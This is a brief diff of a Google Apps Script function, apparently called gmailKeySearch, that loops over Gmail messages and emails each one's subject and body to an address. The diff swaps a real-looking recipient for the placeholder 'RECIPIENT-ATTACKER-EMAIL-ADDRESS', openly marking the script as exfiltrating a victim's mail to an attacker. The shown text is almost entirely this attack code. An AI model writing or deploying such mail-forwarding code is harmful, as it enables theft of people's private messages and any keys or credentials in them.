@@ -84,7 +84,7 @@ function gmailKeySearch() {
         Logger.log(messages[i].getId());
         var id = messages[i].getId();
         MailApp.sendEmail({
-          to: "greg.carson@tmx.com",
+          to: "RECIPIENT-ATTACKER-EMAIL-ADDRESS",
           subject: subject,
           htmlBody: body,
        }); 
